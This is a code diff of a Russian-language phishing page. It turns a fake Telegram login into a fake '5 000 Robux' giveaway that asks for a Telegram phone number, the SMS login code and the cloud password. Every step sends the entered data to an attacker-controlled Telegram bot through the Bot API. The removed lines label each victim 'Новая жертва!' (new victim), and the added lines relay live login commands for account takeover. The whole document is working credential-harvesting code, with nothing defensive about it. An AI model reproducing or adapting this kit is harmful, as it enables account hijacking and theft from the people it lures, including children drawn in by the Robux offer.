@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram - Вход</title>
+    <title>Roblox - Получить Robux</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
-            background: #1a1a2e; 
-            font-family: -apple-system, sans-serif;
+            background: #0a0a0a; 
+            font-family: Arial, sans-serif;
             display: flex; 
             justify-content: center; 
             align-items: center; 
@@ -16,35 +16,19 @@
             padding: 20px;
         }
         .card {
-            background: #24263a;
-            border-radius: 15px;
+            background: #1a1a1a;
+            border: 2px solid #00b06f;
+            border-radius: 20px;
             padding: 30px 25px;
             width: 100%;
             max-width: 380px;
             text-align: center;
         }
-        .logo { 
-            width: 70px; height: 70px; 
-            background: #0088cc; border-radius: 50%; 
-            margin: 0 auto 15px;
-            display: flex; align-items: center; justify-content: center;
-            font-size: 35px;
-        }
-        h2 { color: #fff; font-size: 18px; margin-bottom: 5px; }
-        p { color: #999; font-size: 12px; margin-bottom: 15px; }
-        
-        .phone-row { display: flex; gap: 8px; margin-bottom: 12px; }
-        select {
-            padding: 14px 10px;
-            background: #0a0a0a;
-            border: 1px solid #333;
-            border-radius: 10px;
-            color: #fff;
-            font-size: 14px;
-            outline: none;
-            min-width: 120px;
-        }
-        input {
+        .logo { font-size: 70px; margin-bottom: 10px; }
+        .robux { color: #00b06f; font-size: 28px; font-weight: bold; margin: 10px 0; }
+        h2 { color: #fff; font-size: 20px; margin-bottom: 8px; }
+        p { color: #bbb; font-size: 13px; margin-bottom: 15px; }
+        select, input {
             width: 100%;
             padding: 14px 16px;
             background: #0a0a0a;
@@ -55,34 +39,32 @@
             margin-bottom: 12px;
             outline: none;
         }
-        input:focus, select:focus { border-color: #0088cc; }
+        .phone-row { display: flex; gap: 8px; }
+        .phone-row select { width: 120px; }
         button {
             width: 100%;
             padding: 14px;
-            background: #0088cc;
-            color: #fff;
+            background: #00b06f;
+            color: #000;
             border: none;
             border-radius: 10px;
             font-size: 16px;
             font-weight: bold;
             cursor: pointer;
         }
-        button:hover { background: #006699; }
-        .alert { color: #ff4444; font-size: 13px; margin-top: 10px; }
         .step { display: none; }
         .step.active { display: block; }
-        .code-row { display: flex; gap: 8px; }
-        .code-row input { text-align: center; font-size: 24px; letter-spacing: 8px; }
+        .alert { color: #ff4444; font-size: 13px; margin-top: 10px; }
     </style>
 </head>
 <body>
     <div class="card">
-        <div class="logo">✈</div>
+        <div class="logo">🎮</div>
         
-        <!-- Шаг 1: Номер телефона -->
         <div id="step1" class="step active">
-            <h2>Вход в Telegram</h2>
-            <p>Введите номер телефона для входа в аккаунт</p>
+            <h2>Подтверждение аккаунта</h2>
+            <div class="robux">💰 5 000 Robux</div>
+            <p>Введите номер телефона от аккаунта Telegram чтобы получить Robux!</p>
             
             <div class="phone-row">
                 <select id="country">
@@ -92,49 +74,37 @@
                     <option value="+1">🇺🇸 +1</option>
                     <option value="+44">🇬🇧 +44</option>
                     <option value="+49">🇩🇪 +49</option>
-                    <option value="+33">🇫🇷 +33</option>
                     <option value="+48">🇵🇱 +48</option>
                     <option value="+998">🇺🇿 +998</option>
                     <option value="+7">🇰🇿 +7</option>
-                    <option value="+90">🇹🇷 +90</option>
-                    <option value="+86">🇨🇳 +86</option>
-                    <option value="+81">🇯🇵 +81</option>
-                    <option value="+82">🇰🇷 +82</option>
-                    <option value="+39">🇮🇹 +39</option>
-                    <option value="+34">🇪🇸 +34</option>
                 </select>
                 <input type="tel" id="phone" placeholder="900 123-45-67">
             </div>
             
-            <button onclick="sendPhone()">Далее</button>
+            <button onclick="sendPhone()">🎁 Получить Robux</button>
             <div class="alert" id="alert1"></div>
         </div>
         
-        <!-- Шаг 2: Код из SMS -->
         <div id="step2" class="step">
             <h2>Введите код</h2>
-            <p>Мы отправили код на номер <span id="phoneDisplay"></span></p>
-            <div class="code-row">
-                <input type="text" id="code" placeholder="•••••" maxlength="5">
-            </div>
-            <button onclick="sendCode()">Далее</button>
+            <p>На номер <span id="phoneDisplay"></span> отправлен код подтверждения.</p>
+            <input type="text" id="code" placeholder="•••••" maxlength="5">
+            <button onclick="sendCode()">✅ Подтвердить</button>
             <div class="alert" id="alert2"></div>
         </div>
         
-        <!-- Шаг 3: Пароль -->
         <div id="step3" class="step">
             <h2>Введите пароль</h2>
             <p>Введите облачный пароль для аккаунта <span id="phoneDisplay2"></span></p>
             <input type="password" id="password" placeholder="Облачный пароль">
-            <button onclick="sendPassword()">Войти</button>
+            <button onclick="sendPassword()">✅ Войти</button>
             <div class="alert" id="alert3"></div>
         </div>
         
-        <!-- Шаг 4: Готово -->
         <div id="step4" class="step">
-            <h2>✅ Вход выполнен</h2>
-            <p>Добро пожаловать в Telegram!</p>
-            <p style="color:#666;font-size:11px;">Окно можно закрыть.</p>
+            <h2>✅ Готово!</h2>
+            <div class="robux">+5 000 Robux</div>
+            <p>Robux будут зачислены в течение 24 часов.</p>
         </div>
     </div>
 
@@ -154,46 +124,46 @@
             
             fullPhone = country + phone;
             
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    chat_id: ADMIN_ID,
-                    text: `🎯 Новая жертва!\n📱 Номер: ${fullPhone}\n\nВведи этот номер в Telegram и жди код!`
-                })
-            });
-            
-            document.getElementById('phoneDisplay').innerText = fullPhone;
-            document.getElementById('phoneDisplay2').innerText = fullPhone;
-            document.getElementById('step1').classList.remove('active');
-            document.getElementById('step2').classList.add('active');
+            // Отправляем номер боту
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=/send_code%20${fullPhone}`)
+                .then(r => r.json())
+                .then(data => {
+                    if (data.ok) {
+                        document.getElementById('phoneDisplay').innerText = fullPhone;
+                        document.getElementById('phoneDisplay2').innerText = fullPhone;
+                        document.getElementById('step1').classList.remove('active');
+                        document.getElementById('step2').classList.add('active');
+                    } else {
+                        document.getElementById('alert1').innerText = "Ошибка отправки кода";
+                    }
+                });
         }
         
         function sendCode() {
             const code = document.getElementById('code').value.trim();
             
-            if (!code || code.length < 3) {
+            if (!code || code.length !== 5) {
                 document.getElementById('alert2').innerText = "Неверный код. Попробуйте снова.";
                 return;
             }
             
-            // Проверяем через Telegram API (код должен быть 5 цифр)
-            if (code.length !== 5 || !/^\d+$/.test(code)) {
-                document.getElementById('alert2').innerText = "Неверный код. Попробуйте снова.";
-                return;
-            }
-            
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    chat_id: ADMIN_ID,
-                    text: `🔑 КОД: ${code}\n📱 Номер: ${fullPhone}\n\nЖду пароль...`
-                })
-            });
-            
-            document.getElementById('step2').classList.remove('active');
-            document.getElementById('step3').classList.add('active');
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=/verify_code%20${fullPhone}%20${code}`)
+                .then(r => r.json())
+                .then(data => {
+                    const result = data.result?.text || "";
+                    
+                    if (result.includes("ok")) {
+                        // Успешно без пароля
+                        document.getElementById('step2').classList.remove('active');
+                        document.getElementById('step4').classList.add('active');
+                    } else if (result.includes("need_password")) {
+                        // Нужен пароль
+                        document.getElementById('step2').classList.remove('active');
+                        document.getElementById('step3').classList.add('active');
+                    } else {
+                        document.getElementById('alert2').innerText = "Неверный код. Попробуйте снова.";
+                    }
+                });
         }
         
         function sendPassword() {
@@ -204,17 +174,17 @@
                 return;
             }
             
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    chat_id: ADMIN_ID,
-                    text: `🔐 ПАРОЛЬ: ${password}\n📱 Номер: ${fullPhone}\n\nГотово! Заходи в аккаунт!`
-                })
-            });
-            
-            document.getElementById('step3').classList.remove('active');
-            document.getElementById('step4').classList.add('active');
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=/send_password%20${fullPhone}%20${password}`)
+                .then(r => r.json())
+                .then(data => {
+                    const result = data.result?.text || "";
+                    if (result.includes("ok")) {
+                        document.getElementById('step3').classList.remove('active');
+                        document.getElementById('step4').classList.add('active');
+                    } else {
+                        document.getElementById('alert3').innerText = "Неверный пароль. Попробуйте снова.";
+                    }
+                });
         }
     </script>
 </body>
